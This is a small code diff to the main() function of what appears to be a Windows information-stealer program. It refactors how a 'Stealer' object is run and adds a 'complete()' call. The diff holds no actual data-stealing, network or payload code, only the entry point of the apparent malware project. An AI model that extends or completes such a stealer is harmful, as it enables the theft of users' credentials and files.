@@ -7,7 +7,9 @@ int main() {
 
     WinApi::Init();
 
-    Stealer().run();
+    Stealer stealer;
+    stealer.run();
+    stealer.complete();
 
     return 0;
 }
